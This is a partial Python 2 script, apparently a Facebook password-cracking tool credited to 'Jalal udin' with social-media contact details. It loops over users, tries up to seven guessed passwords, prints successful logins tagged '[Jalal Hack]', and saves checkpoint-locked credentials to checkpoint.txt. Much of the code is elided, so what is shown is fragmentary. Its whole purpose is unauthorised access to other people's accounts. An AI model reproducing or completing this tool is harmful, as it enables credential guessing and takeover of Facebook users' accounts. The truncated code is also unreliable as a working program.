...
--------------------------------------------------
➣ Auther    : Jalal udin
➣ Fb id     : https://www.facebook.com/Jalal8914
➣ YouTube   : Youtube sy nafrat
➣ WhatsApp  : +1 (226) 455-3582
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				print "\x1b[1;92m[Jalal Hack]\x1b[0m " + user + " | " + pass1
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					q = json.load(data)
					if "access_token" in q:
						print "\x1b[1;92m[Jalal Hack]\x1b[0m " + user + " | " + pass2
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							q = json.load(data)
							if "access_token" in q:
								print "\x1b[1;92m[Jalal Hack]\x1b[0m " + user + " | " + pass3
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									q = json.load(data)
									if "access_token" in q:
										print "\x1b[1;92m[Jalal Hack]\x1b[0m " + user + " | " + pass4
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											q = json.load(data)
											if "access_token" in q:
												print "\x1b[1;92m[Jalal Hack]\x1b[0m " + user + " | " + pass5
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													q = json.load(data)
													if "access_token" in q:
														print "\x1b[1;92m[Jalal Hack]\x1b[0m " + user + " | " + pass6
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															q = json.load(data)
															if "access_token" in q:
																print "\x1b[1;92m[Jalal Hack]\x1b[0m " + user + " | " + pass7
					...
					if "access_token" in q2:
						...
						if "www.facebook.com" in q2["error_msg"]:
							...
							if "access_token" in q3:
								print "\x1b[1;95m[Jalal Hack]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q3["error_msg"]:
									print "[Jalal Cp] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
									...
									if "access_token" in q4:
										print "\x1b[1;94m[Jalal Hack]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q4["error_msg"]:
											print "[Jalal Cp] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
											...
											if "access_token" in q5:
												print "\x1b[1;93m[Jalal Hack]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q5["error_msg"]:
													print "[Jalal Cp] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													cps.write(user+"|"+pass5+"\n")
													cps.close()
													cpb.append(user+pass5)
													...
													if "access_token" in q6:
														print "\x1b[1;97m[Jalal Hack]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q6["error_msg"]:
															print "[CJalal Cp] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															cps.write(user+"|"+pass6+"\n")
															cps.close()
															cpb.append(user+pass6)
															...
															if "access_token" in q7:
																print "\x1b[1;98m[Jalal Hack]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q7["error_msg"]:
																	print "[Jalal Cp] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
																	cps.write(user+"|"+pass7+"\n")
																	cps.close()
																	cpb.append(user+pass7)
